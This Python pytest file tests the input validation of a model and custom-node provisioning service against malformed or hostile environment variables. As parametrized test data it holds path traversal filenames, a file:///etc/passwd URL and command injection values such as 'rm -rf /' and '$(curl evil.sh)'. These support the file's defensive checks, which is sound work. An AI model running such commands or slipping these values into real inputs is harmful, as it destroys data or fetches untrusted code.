"""Persona: the typo-prone (or hostile) user.

Endpoint env vars are free-form text boxes. People paste the wrong thing,
leave trailing junk, or — since env vars can come from templates shared by
strangers — actively try to abuse the contract. Every failure must be a
clear configuration error before anything touches disk or network, and
nothing in an env var may ever escape the models/custom_nodes sandboxes or
reach a shell.
"""

import pytest

from provisioning import ConfigError, DownloadError, ResolutionError, parse_plan
from tests.conftest import FakeResponse


class TestMalformedModelEntries:
    def test_a_bare_model_name_is_rejected_with_guidance(self, worker):
        worker.environ["CHECKPOINT_URLS"] = "dreamshaper"
        with pytest.raises(ConfigError) as excinfo:
            worker.provision()
        assert "CHECKPOINT_URLS" in str(excinfo.value)
        assert "https://" in str(excinfo.value)

    def test_unsupported_schemes_are_rejected(self, worker):
        worker.environ["CHECKPOINT_URLS"] = "ftp://example.com/model.safetensors"
        with pytest.raises(ConfigError):
            worker.provision()

    def test_file_scheme_cannot_read_the_container_filesystem(self, worker):
        worker.environ["CHECKPOINT_URLS"] = "file:///etc/passwd"
        with pytest.raises(ConfigError):
            worker.provision()

    def test_all_bad_entries_are_reported_at_once(self, worker):
        worker.environ["CHECKPOINT_URLS"] = "not-a-url"
        worker.environ["LORA_URLS"] = "also bad"
        worker.environ["CUSTOM_NODES"] = "bad name!!"
        with pytest.raises(ConfigError) as excinfo:
            worker.provision()
        message = str(excinfo.value)
        assert "not-a-url" in message
        assert "also bad" in message
        assert "bad name!!" in message

    def test_nothing_is_downloaded_when_config_is_invalid(self, worker):
        worker.environ["CHECKPOINT_URLS"] = (
            "https://example.com/good.safetensors, not-a-url"
        )
        with pytest.raises(ConfigError):
            worker.provision()
        assert worker.session.requests == []


class TestPathTraversal:
    """::filename overrides must never escape the target model directory."""

    @pytest.mark.parametrize(
        "filename",
        [
            "../../../handler.py",
            "..\\..\\windows\\path",
            "/etc/cron.d/evil",
            "nested/dir/file.safetensors",
            "..",
        ],
    )
    def test_filename_overrides_with_path_separators_are_rejected(
        self, worker, filename
    ):
        worker.environ["CHECKPOINT_URLS"] = (
            f"https://example.com/model.safetensors::{filename}"
        )
        with pytest.raises(ConfigError):
            worker.provision()
        assert worker.session.requests == []

    def test_civitai_supplied_filenames_are_validated_too(self, worker):
        """A malicious/compromised source could return a traversal filename."""
        worker.civitai.add_model(
            666, versions=[{"id": 6660, "filename": "../../evil.py"}]
        )
        worker.environ["CHECKPOINT_URLS"] = "https://civitai.com/models/666/evil"
        with pytest.raises((ResolutionError, DownloadError)):
            worker.provision()
        assert not (worker.volume_path / "evil.py").exists()
        assert not (worker.comfy_home / "evil.py").exists()


class TestMalformedNodeEntries:
    @pytest.mark.parametrize(
        "entry",
        [
            "comfyui-kjnodes; rm -rf /",
            "comfyui kjnodes",
            "$(curl evil.sh)",
            "comfyui-kjnodes@1.0.0@2.0.0@",
            "-leading-dash",
        ],
    )
    def test_shell_metacharacters_and_bad_ids_never_reach_a_subprocess(
        self, worker, entry
    ):
        worker.environ["CUSTOM_NODES"] = entry
        with pytest.raises(ConfigError):
            worker.provision()
        assert worker.node_runner.calls == []

    def test_valid_and_invalid_node_entries_do_not_partially_apply(self, worker):
        worker.environ["CUSTOM_NODES"] = "comfyui-kjnodes@1.0.0, $(evil)"
        with pytest.raises(ConfigError):
            worker.provision()
        assert worker.node_runner.calls == []


class TestBrokenSources:
    def test_a_404_download_names_the_env_var_and_url(self, worker):
        url = "https://example.com/deleted_model.safetensors"
        worker.session.register(url, FakeResponse(status_code=404))
        worker.environ["LORA_URLS"] = url
        with pytest.raises(DownloadError) as excinfo:
            worker.provision()
        assert "LORA_URLS" in str(excinfo.value)
        assert url in str(excinfo.value)

    def test_civitai_returning_garbage_is_a_clear_error(self, worker):
        worker.session.register(
            "https://civitai.com/api/v1/models/123",
            FakeResponse(text="<html>maintenance</html>"),
        )
        worker.environ["CHECKPOINT_URLS"] = "https://civitai.com/models/123/x"
        with pytest.raises(ResolutionError):
            worker.provision()

    def test_civitai_model_with_no_files_is_a_clear_error(self, worker):
        worker.session.register(
            "https://civitai.com/api/v1/models/321",
            FakeResponse(
                json_data={
                    "id": 321,
                    "type": "Checkpoint",
                    "modelVersions": [{"id": 3210, "files": []}],
                }
            ),
        )
        worker.environ["CHECKPOINT_URLS"] = "https://civitai.com/models/321/empty"
        with pytest.raises(ResolutionError) as excinfo:
            worker.provision()
        assert "no downloadable files" in str(excinfo.value)

    def test_a_failed_download_leaves_no_partial_file_behind(self, worker):
        url = "https://example.com/model.safetensors"

        def explode(u, headers):
            raise ConnectionError("wire cut")

        worker.session.register(url, explode)
        worker.environ["CHECKPOINT_URLS"] = url
        with pytest.raises(DownloadError):
            worker.provision()
        target_dir = worker.models_root / "checkpoints"
        leftovers = list(target_dir.iterdir()) if target_dir.is_dir() else []
        assert leftovers == []


class TestParserContract:
    """Unit-level checks on the env parser other personas rely on."""

    def test_parse_plan_deduplicates_but_preserves_order(self):
        plan = parse_plan(
            {
                "LORA_URLS": (
                    "https://a.com/1.safetensors, https://a.com/2.safetensors, "
                    "https://a.com/1.safetensors"
                )
            }
        )
        assert [m.url for m in plan.models] == [
            "https://a.com/1.safetensors",
            "https://a.com/2.safetensors",
        ]

    def test_every_documented_env_var_maps_to_a_directory(self):
        from provisioning import MODEL_ENV_VARS

        plan = parse_plan(
            {var: f"https://a.com/{var.lower()}.safetensors" for var in MODEL_ENV_VARS}
        )
        assert sorted(m.directory for m in plan.models) == sorted(
            MODEL_ENV_VARS.values()
        )

    def test_unknown_env_vars_are_ignored(self):
        plan = parse_plan({"MOTION_MODULE_URLS": "https://a.com/x.safetensors"})
        assert plan.is_empty
